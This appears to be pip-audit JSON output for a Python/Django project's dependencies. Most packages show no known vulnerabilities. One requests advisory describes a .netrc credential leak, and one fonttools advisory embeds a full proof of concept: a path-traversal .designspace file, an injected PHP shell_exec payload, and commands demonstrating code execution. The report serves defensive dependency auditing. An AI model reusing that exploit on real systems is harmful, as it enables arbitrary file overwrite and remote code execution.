{"dependencies": [{"name": "annotated-types", "version": "0.7.0", "vulns": []}, {"name": "anyio", "version": "4.12.0", "vulns": []}, {"name": "asgiref", "version": "3.11.0", "vulns": []}, {"name": "attrs", "version": "25.4.0", "vulns": []}, {"name": "authlib", "version": "1.6.5", "vulns": []}, {"name": "bandit", "version": "1.9.2", "vulns": []}, {"name": "black", "version": "25.11.0", "vulns": []}, {"name": "boolean-py", "version": "5.0", "vulns": []}, {"name": "brotli", "version": "1.2.0", "vulns": []}, {"name": "cachecontrol", "version": "0.14.4", "vulns": []}, {"name": "certifi", "version": "2025.11.12", "vulns": []}, {"name": "cffi", "version": "2.0.0", "vulns": []}, {"name": "charset-normalizer", "version": "3.4.4", "vulns": []}, {"name": "click", "version": "8.3.1", "vulns": []}, {"name": "colorama", "version": "0.4.6", "vulns": []}, {"name": "coverage", "version": "7.12.0", "vulns": []}, {"name": "cryptography", "version": "46.0.3", "vulns": []}, {"name": "cssbeautifier", "version": "1.15.4", "vulns": []}, {"name": "cssselect2", "version": "0.8.0", "vulns": []}, {"name": "cyclonedx-python-lib", "version": "11.6.0", "vulns": []}, {"name": "defusedxml", "version": "0.7.1", "vulns": []}, {"name": "django", "version": "5.2.9", "vulns": []}, {"name": "django-csp", "version": "4.0", "vulns": []}, {"name": "django-environ", "version": "0.12.0", "vulns": []}, {"name": "django-ratelimit", "version": "4.1.0", "vulns": []}, {"name": "djangorestframework", "version": "3.15.2", "vulns": []}, {"name": "djlint", "version": "1.36.4", "vulns": []}, {"name": "dparse", "version": "0.6.4", "vulns": []}, {"name": "drf-spectacular", "version": "0.28.0", "vulns": []}, {"name": "editorconfig", "version": "0.17.1", "vulns": []}, {"name": "factory-boy", "version": "3.3.1", "vulns": []}, {"name": "faker", "version": "38.2.0", "vulns": []}, {"name": "filelock", "version": "3.20.0", "vulns": []}, {"name": "fonttools", "version": "4.60.1", "vulns": [{"id": "CVE-2025-66034", "fix_versions": ["4.60.2"], "aliases": ["GHSA-768j-98cg-p3fv"], "description": "## Summary  The `fonttools varLib` (or `python3 -m fontTools.varLib`) script has an arbitrary file write vulnerability that leads to remote code execution when a malicious .designspace file is processed. The vulnerability affects the `main()` code path of `fontTools.varLib`, used by the fonttools varLib CLI and any code that invokes `fontTools.varLib.main()`.  The vulnerability exists due to unsanitised filename handling combined with content injection. Attackers can write files to arbitrary filesystem locations via path traversal sequences, and inject malicious code (like PHP) into the output files through XML injection in labelname elements. When these files are placed in web-accessible locations and executed, this achieves remote code execution without requiring any elevated privileges. Once RCE is obtained, attackers can further escalate privileges to compromise system files (like overwriting `/etc/passwd`).  Overall this allows attackers to: - Write font files to arbitrary locations on the filesystem - Overwrite configuration files - Corrupt application files and dependencies - Obtain remote code execution  The attacker controls the file location, extension and contents which could lead to remote code execution as well as enabling a denial of service through file corruption means.  ## Affected Lines  `fontTools/varLib/__init__.py` ```python filename = vf.filename # Unsanitised filename output_path = os.path.join(output_dir, filename) # Path traversal vf.save(output_path) # Arbitrary file write ```  ## PoC 1. Set up `malicious.designspace` and respective `source-*.ttf` files in a directory like `/Users/<username>/testing/demo/` (will impact relative file location within malicious.designspace)  `setup.py` ```python #!/usr/bin/env python3 import os  from fontTools.fontBuilder import FontBuilder from fontTools.pens.ttGlyphPen import TTGlyphPen  def create_source_font(filename, weight=400):     fb = FontBuilder(unitsPerEm=1000, isTTF=True)     fb.setupGlyphOrder([\".notdef\"])     fb.setupCharacterMap({})          pen = TTGlyphPen(None)     pen.moveTo((0, 0))     pen.lineTo((500, 0))     pen.lineTo((500, 500))     pen.lineTo((0, 500))     pen.closePath()          fb.setupGlyf({\".notdef\": pen.glyph()})     fb.setupHorizontalMetrics({\".notdef\": (500, 0)})     fb.setupHorizontalHeader(ascent=800, descent=-200)     fb.setupOS2(usWeightClass=weight)     fb.setupPost()     fb.setupNameTable({\"familyName\": \"Test\", \"styleName\": f\"Weight{weight}\"})     fb.save(filename)  if __name__ == '__main__':     os.chdir(os.path.dirname(os.path.abspath(__file__)))     create_source_font(\"source-light.ttf\", weight=100)     create_source_font(\"source-regular.ttf\", weight=400) ```  `malicious.designspace` ```xml <?xml version='1.0' encoding='UTF-8'?> <designspace format=\"5.0\">   <axes>     <axis tag=\"wght\" name=\"Weight\" minimum=\"100\" maximum=\"900\" default=\"400\"/>   </axes>      <sources>     <source filename=\"source-light.ttf\" name=\"Light\">       <location>         <dimension name=\"Weight\" xvalue=\"100\"/>       </location>     </source>     <source filename=\"source-regular.ttf\" name=\"Regular\">       <location>         <dimension name=\"Weight\" xvalue=\"400\"/>       </location>     </source>   </sources>      <!-- Filename can be arbitrarily set to any path on the filesystem -->   <variable-fonts>     <variable-font name=\"MaliciousFont\" filename=\"../../tmp/newarbitraryfile.json\">       <axis-subsets>         <axis-subset name=\"Weight\"/>       </axis-subsets>     </variable-font>   </variable-fonts> </designspace> ```  Optional: You can put a file with any material within `../../tmp/newarbitraryfile.json` in advance, the contents in the file will be overwritten after running the setup script in the following step.  2. Run the setup.py script to generate `source-*.tff` files required for the malicious.designspace file. ```bash python3 setup.py ``` 3. Execute the given payload using the vulnerable varLib saving the file into the arbitrary file location of filename ```bash fonttools varLib malicious.designspace ``` 4. Validate arbitrary file write was performed by looking at path assigned within malicious designspace ```bash cat {{filename_location}} ``` 5. After validating that we can provide arbitrary write to any location, we can also validate that we can control sections of content as well demonstrated with the below payload.  `malicious2.designspace` ```xml <?xml version='1.0' encoding='UTF-8'?> <designspace format=\"5.0\"> \t<axes>         <!-- XML injection occurs in labelname elements with CDATA sections --> \t    <axis tag=\"wght\" name=\"Weight\" minimum=\"100\" maximum=\"900\" default=\"400\"> \t        <labelname xml:lang=\"en\"><![CDATA[<?php echo shell_exec(\"/usr/bin/touch /tmp/MEOW123\");?>]]]]><![CDATA[>]]></labelname> \t        <labelname xml:lang=\"fr\">MEOW2</labelname> \t    </axis> \t</axes> \t<axis tag=\"wght\" name=\"Weight\" minimum=\"100\" maximum=\"900\" default=\"400\"/> \t<sources> \t\t<source filename=\"source-light.ttf\" name=\"Light\"> \t\t\t<location> \t\t\t\t<dimension name=\"Weight\" xvalue=\"100\"/> \t\t\t</location> \t\t</source> \t\t<source filename=\"source-regular.ttf\" name=\"Regular\"> \t\t\t<location> \t\t\t\t<dimension name=\"Weight\" xvalue=\"400\"/> \t\t\t</location> \t\t</source> \t</sources> \t<variable-fonts> \t\t<variable-font name=\"MyFont\" filename=\"output.ttf\"> \t\t\t<axis-subsets> \t\t\t\t<axis-subset name=\"Weight\"/> \t\t\t</axis-subsets> \t\t</variable-font> \t</variable-fonts> \t<instances> \t\t<instance name=\"Display Thin\" familyname=\"MyFont\" stylename=\"Thin\"> \t\t\t<location><dimension name=\"Weight\" xvalue=\"100\"/></location> \t\t\t<labelname xml:lang=\"en\">Display Thin</labelname> \t\t</instance> \t</instances> </designspace> ```  6. When the program is run, we can show we control the contents in the new file ```bash fonttools varLib malicious2.designspace -o file123 ``` Here being outputted to a localised area ignoring filename presented in variable-font  7. We can look inside file123 to validate user controlled injection ```bash cat file123 ``` to show `<?php echo shell_exec(\"/usr/bin/touch /tmp/MEOW123\");?>]]>`  8. Executing the file and reading looking at the newly generated file ```bash php file123 ls -la /tmp/MEOW123 ``` we can see that the file was just created showing RCE.  ## Recommendations  - Ensure output file paths configured within designspace files are restricted to the local directory or consider further security measures to prevent arbitrary file write/overwrite within any directory on the system"}]}, {"name": "gunicorn", "version": "23.0.0", "vulns": []}, {"name": "h11", "version": "0.16.0", "vulns": []}, {"name": "httpcore", "version": "1.0.9", "vulns": []}, {"name": "httpx", "version": "0.28.1", "vulns": []}, {"name": "idna", "version": "3.11", "vulns": []}, {"name": "inflection", "version": "0.5.1", "vulns": []}, {"name": "iniconfig", "version": "2.3.0", "vulns": []}, {"name": "isort", "version": "7.0.0", "vulns": []}, {"name": "jinja2", "version": "3.1.6", "vulns": []}, {"name": "joblib", "version": "1.5.2", "vulns": []}, {"name": "jsbeautifier", "version": "1.15.4", "vulns": []}, {"name": "json5", "version": "0.12.1", "vulns": []}, {"name": "jsonschema", "version": "4.25.1", "vulns": []}, {"name": "jsonschema-specifications", "version": "2025.9.1", "vulns": []}, {"name": "license-expression", "version": "30.4.4", "vulns": []}, {"name": "markdown-it-py", "version": "4.0.0", "vulns": []}, {"name": "markupsafe", "version": "3.0.3", "vulns": []}, {"name": "marshmallow", "version": "4.1.1", "vulns": []}, {"name": "mdurl", "version": "0.1.2", "vulns": []}, {"name": "msgpack", "version": "1.1.2", "vulns": []}, {"name": "mypy-extensions", "version": "1.1.0", "vulns": []}, {"name": "nltk", "version": "3.9.2", "vulns": []}, {"name": "packageurl-python", "version": "0.17.6", "vulns": []}, {"name": "packaging", "version": "25.0", "vulns": []}, {"name": "pathspec", "version": "0.12.1", "vulns": []}, {"name": "pillow", "version": "12.0.0", "vulns": []}, {"name": "pip-api", "version": "0.0.34", "vulns": []}, {"name": "pip-audit", "version": "2.10.0", "vulns": []}, {"name": "pip-requirements-parser", "version": "32.0.1", "vulns": []}, {"name": "platformdirs", "version": "4.5.1", "vulns": []}, {"name": "pluggy", "version": "1.6.0", "vulns": []}, {"name": "psutil", "version": "7.0.0", "vulns": []}, {"name": "psycopg2-binary", "version": "2.9.11", "vulns": []}, {"name": "py-serializable", "version": "2.1.0", "vulns": []}, {"name": "pycparser", "version": "2.23", "vulns": []}, {"name": "pydantic", "version": "2.12.5", "vulns": []}, {"name": "pydantic-core", "version": "2.41.5", "vulns": []}, {"name": "pydyf", "version": "0.11.0", "vulns": []}, {"name": "pygments", "version": "2.19.2", "vulns": []}, {"name": "pyotp", "version": "2.9.0", "vulns": []}, {"name": "pyparsing", "version": "3.2.5", "vulns": []}, {"name": "pyphen", "version": "0.17.2", "vulns": []}, {"name": "pypng", "version": "0.20220715.0", "vulns": []}, {"name": "pytest", "version": "8.4.0", "vulns": []}, {"name": "pytest-cov", "version": "6.1.1", "vulns": []}, {"name": "pytest-django", "version": "4.10.0", "vulns": []}, {"name": "python-dateutil", "version": "2.9.0", "vulns": []}, {"name": "python-http-client", "version": "3.3.7", "vulns": []}, {"name": "pytokens", "version": "0.3.0", "vulns": []}, {"name": "pyyaml", "version": "6.0.3", "vulns": []}, {"name": "qrcode", "version": "7.4.2", "vulns": []}, {"name": "referencing", "version": "0.37.0", "vulns": []}, {"name": "regex", "version": "2025.11.3", "vulns": []}, {"name": "requests", "version": "2.32.3", "vulns": [{"id": "CVE-2024-47081", "fix_versions": ["2.32.4"], "aliases": ["GHSA-9hjg-9r4m-mvj7"], "description": "### Impact  Due to a URL parsing issue, Requests releases prior to 2.32.4 may leak .netrc credentials to third parties for specific maliciously-crafted URLs.  ### Workarounds For older versions of Requests, use of the .netrc file can be disabled with `trust_env=False` on your Requests Session ([docs](https://requests.readthedocs.io/en/latest/api/#requests.Session.trust_env)).  ### References https://github.com/psf/requests/pull/6965 https://seclists.org/fulldisclosure/2025/Jun/2"}]}, {"name": "rich", "version": "14.2.0", "vulns": []}, {"name": "rpds-py", "version": "0.30.0", "vulns": []}, {"name": "ruamel-yaml", "version": "0.18.16", "vulns": []}, {"name": "ruamel-yaml-clib", "version": "0.2.15", "vulns": []}, {"name": "ruff", "version": "0.14.8", "vulns": []}, {"name": "safety", "version": "3.7.0", "vulns": []}, {"name": "safety-schemas", "version": "0.0.16", "vulns": []}, {"name": "sendgrid", "version": "6.12.5", "vulns": []}, {"name": "sentry-sdk", "version": "1.45.1", "vulns": []}, {"name": "shellingham", "version": "1.5.4", "vulns": []}, {"name": "six", "version": "1.17.0", "vulns": []}, {"name": "sortedcontainers", "version": "2.4.0", "vulns": []}, {"name": "sqlparse", "version": "0.5.4", "vulns": []}, {"name": "stevedore", "version": "5.6.0", "vulns": []}, {"name": "tenacity", "version": "9.1.2", "vulns": []}, {"name": "tinycss2", "version": "1.5.0", "vulns": []}, {"name": "tinyhtml5", "version": "2.0.0", "vulns": []}, {"name": "tomli", "version": "2.3.0", "vulns": []}, {"name": "tomli-w", "version": "1.2.0", "vulns": []}, {"name": "tomlkit", "version": "0.13.3", "vulns": []}, {"name": "tqdm", "version": "4.67.1", "vulns": []}, {"name": "typer", "version": "0.20.0", "vulns": []}, {"name": "typing-extensions", "version": "4.15.0", "vulns": []}, {"name": "typing-inspection", "version": "0.4.2", "vulns": []}, {"name": "tzdata", "version": "2025.2", "vulns": []}, {"name": "uritemplate", "version": "4.2.0", "vulns": []}, {"name": "urllib3", "version": "2.6.0", "vulns": []}, {"name": "weasyprint", "version": "66.0", "vulns": []}, {"name": "webencodings", "version": "0.5.1", "vulns": []}, {"name": "werkzeug", "version": "3.1.4", "vulns": []}, {"name": "whitenoise", "version": "6.11.0", "vulns": []}, {"name": "zopfli", "version": "0.4.0", "vulns": []}], "fixes": []}
